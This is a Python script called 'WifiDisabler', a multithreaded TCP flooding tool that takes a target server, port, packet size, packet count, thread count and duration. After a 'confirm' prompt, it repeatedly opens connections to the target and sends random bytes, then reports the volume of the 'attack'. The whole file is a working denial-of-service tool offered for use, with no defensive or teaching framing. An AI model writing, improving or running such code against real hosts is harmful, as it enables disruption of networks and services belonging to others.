import sys
import random
import socket
import time
import threading

if "-h" in sys.argv or "-help" in sys.argv:
    print("""
    WifiDisabler Help Menu
    ======================

    Usage: python3 disabler.py [SERVER] [ARGUMENTS]
    
    Arguments:
        -p - port
        -s - size
        -c - count
        -t - threads
        -d - duration""")
    
    exit()

print(r"""
  __---__  ##   ##
 / __-__ \  ## ##
  / ___ \    ###
   /   \    ## ##
     @     ##   ##
-------------------""")

try:

    target = sys.argv[1]
    port = int(sys.argv[sys.argv.index("-p") + 1])
    size = int(sys.argv[sys.argv.index("-s") + 1])
    packets = int(sys.argv[sys.argv.index("-c") + 1])
    number_of_threads = int(sys.argv[sys.argv.index("-t") + 1])
    duration = float(sys.argv[sys.argv.index("-d") + 1])

except:

    print("\nInvalid usage\n[-h / -help] for usage help")
    exit()

print(f"""
WifiDisabler
Author: Gilbert Enevoldsen
Parameters:

* Server:.....: {target}
* Port:.......: {port}
* Size:.......: {size}b
* Packets:....: {packets}
* Threads:....: {number_of_threads}
* Duration:...: {duration}s

Disabler ping: (TCP, {size}b)""")

pings = 0
disable_running = False
exiting = False

print("Initiating thread(s)... 0%", end="\r")

def flood(target, port):
    
    global pings
    global disable_running
    global exiting
    global size
    global packets
    
    while disable_running == False: 
        time.sleep(0.1)
        if exiting == True: exit()
    
    while True:

        try:
        
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(packets):
                s.send(random._urandom(size))
                pings += 1
    
            s.close()

        except:
            
            pass
        
        if disable_running == False: break
        if exiting == True: exit()

try:

    for thread_index in range(number_of_threads):
        
        print(f"Initiating thread(s)... {round((thread_index / (number_of_threads + 1)) * 100, 1)}%", end="\r")
        
        try:
            
            thread = threading.Thread(target=flood, args=[target, port])
            thread.start()
            
        except:
            
            pass
    
    print(f"Initiating thread(s)... 100%          ")
    print("Threads initiated          \n")

    print("Attack ready\nLaunch: (confirm): ", end="")

    if input() != "confirm":
        
        print("\nconfirm failed")
        exiting = True
        exit()

    disable_running = True

    start_time = time.time()

    print("\n ---~~~==={ Disabling Wifi }===~~~---")

    while (time.time() - start_time) < duration: pass

    disable_running = False

    print(f"\nAttack ended with {pings * size} bytes sent and {pings} pings sent")
    print("Killing threads...")

except:
    
    exiting = True
    print("\nAn error occurred")
    exit()